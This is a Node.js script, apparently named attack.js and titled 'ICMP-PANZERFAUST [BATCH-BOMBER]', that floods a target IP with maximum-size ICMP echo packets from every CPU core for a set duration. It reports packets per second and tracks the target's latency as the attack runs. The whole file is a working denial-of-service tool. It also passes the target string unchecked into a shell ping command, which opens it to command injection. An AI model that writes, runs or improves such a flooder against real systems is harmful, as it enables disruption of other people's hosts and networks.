const raw = require('raw-socket');
const cluster = require('cluster');
const os = require('os');
const { exec } = require('child_process');

const target = process.argv[2];
const duration = parseInt(process.argv[3]);

if (!target || isNaN(duration)) {
  console.log('Usage: node attack.js <target_ip> <duration_seconds>');
  process.exit(1);
}

const cores = os.cpus().length;
const endTime = Date.now() + duration * 1000;

if (cluster.isMaster) {
  let stats = { sent: 0, success: 0, failed: 0, maxpps: 0, bytesSent: 0 };
  let lastLatency = 'N/A';

  console.clear();
  console.log('ICMP-PANZERFAUST [BATCH-BOMBER]');
  console.log('--------------------------------------');
  console.log(`Target: ${target}`);
  console.log(`Duration: ${duration}s`);
  console.log(`Using ${cores} cores`);
  console.log('Launching...\n');

  for (let i = 0; i < cores; i++) cluster.fork();

  for (const id in cluster.workers) {
    cluster.workers[id].on('message', (msg) => {
      if (msg.type === 'stats') {
        stats.sent += msg.sent;
        stats.success += msg.success;
        stats.failed += msg.failed;
        stats.bytesSent += msg.bytesSent;
        if (msg.pps > stats.maxpps) stats.maxpps = msg.pps;
      }
    });
  }

  setInterval(() => {
    console.clear();
    console.log('ICMP-PANZERFAUST [BATCH-BOMBER]');
    console.log('--------------------------------------');
    console.log(`Success: ${stats.success}`);
    console.log(`Failed: ${stats.failed}`);
    console.log(`Max PPS: ${stats.maxpps}`);
    console.log(`Total Sent Packets: ${stats.sent}`);
    console.log(`Total Bytes Sent: ${(stats.bytesSent / (1024 * 1024)).toFixed(2)} MB`);
    console.log(`Target Latency: ${lastLatency} ms`);
    console.log('--------------------------------------');
    stats.maxpps = 0;
  }, 2000);

  setInterval(() => {
    exec(`ping -c 1 ${target}`, (err, stdout) => {
      const match = stdout.match(/time=([\d.]+) ms/);
      if (match) lastLatency = match[1];
    });
  }, 4000);

  setTimeout(() => {
    for (const id in cluster.workers) cluster.workers[id].kill();
    console.log('\nAttack finished.');
    process.exit(0);
  }, duration * 1000);

} else {
  const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });

  let seq = 0;
  let sent = 0;
  let success = 0;
  let failed = 0;
  let pps = 0;
  let bytesSent = 0;

  // Max payload size: 65507 bytes
  const payloadSize = 65507;
  const totalPacketSize = 8 + payloadSize; // ICMP header + payload

  // Create max size packet buffer once, then update seq
  function createPacket(seqNum) {
    const buf = Buffer.alloc(8 + payloadSize);
    buf.writeUInt8(8, 0); // Type: Echo Request
    buf.writeUInt8(0, 1); // Code
    buf.writeUInt16BE(0, 2); // checksum placeholder
    buf.writeUInt16BE(process.pid & 0xffff, 4); // ID
    buf.writeUInt16BE(seqNum & 0xffff, 6); // Seq

    // Fill payload with random data for max size
    for(let i=8; i<buf.length; i++) {
      buf[i] = 0x42; // ASCII '*'
    }

    // Compute checksum
    let sum = 0;
    for (let i = 0; i < buf.length; i += 2) {
      sum += buf.readUInt16BE(i);
    }
    while (sum >> 16) {
      sum = (sum & 0xffff) + (sum >> 16);
    }
    const checksum = (~sum) & 0xffff;
    buf.writeUInt16BE(checksum, 2);

    return buf;
  }

  function batchSend(count) {
    if (Date.now() >= endTime) return;

    for (let i = 0; i < count; i++) {
      const pkt = createPacket(seq++);
      socket.send(pkt, 0, pkt.length, target, (err) => {
        sent++;
        pps++;
        bytesSent += pkt.length;
        if (err) failed++;
        else success++;
      });
    }

    setImmediate(() => batchSend(count));
  }

  // Start batch send: you can increase batch count here
  batchSend(10);

  setInterval(() => {
    process.send({ type: 'stats', sent, success, failed, pps, bytesSent });
    sent = success = failed = pps = bytesSent = 0;
  }, 2000);
}
